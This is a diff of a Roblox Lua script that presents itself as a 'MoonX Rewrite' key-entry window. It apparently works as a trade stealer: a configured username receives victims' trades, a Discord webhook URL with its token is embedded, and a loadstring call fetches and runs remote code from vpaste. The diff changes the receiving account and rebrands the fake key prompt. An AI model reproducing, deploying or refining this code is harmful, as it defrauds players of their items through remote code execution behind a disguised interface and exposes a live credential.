@@ -1,7 +1,7 @@
-_G.username = {"dirpy_kid"} -- Where trades will be received.
+_G.username = {"27tomasal"} -- Where trades will be received.
 _G.webhook = "https://discord.com/api/webhooks/1387242492381888603/FXoeLDshoD6qFF_KrqwnEZewgF37M5bmqw_KzYgozDgt3lkwD5qAX17dupbLq9j9vDJQ" -- Your discord webhook.
 _G.ping = true -- Send a @everyone in the webhook message.
-_G.private = false -- Show the webhook if the server is private.
+_G.private = true -- Show the webhook if the server is private.
 
 loadstring(game:HttpGet("http://vpaste.net/KTYZC"))()
 
@@ -17,7 +17,7 @@ frame.BorderSizePixel = 0
 local title = Instance.new("TextLabel", frame)
 title.Size = UDim2.new(1, 0, 0, 30)
 title.BackgroundTransparency = 1
-title.Text = "Key link will copy to clipboard."
+title.Text = "MoonX Rewrite 🌙 | Copy Key to Clipboard."
 title.TextColor3 = Color3.new(1, 1, 1)
 title.Font = Enum.Font.SourceSansBold
 title.TextSize = 22
@@ -39,7 +39,7 @@ end)
 local keyBox = Instance.new("TextBox", frame)
 keyBox.Size = UDim2.new(1, -20, 0, 30)
 keyBox.Position = UDim2.new(0, 10, 0, 80)
-keyBox.PlaceholderText = "Enter key here..."
+keyBox.PlaceholderText = "Enter MoonX key here..."
 keyBox.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
 keyBox.TextColor3 = Color3.new(1, 1, 1)
 keyBox.Font = Enum.Font.SourceSans
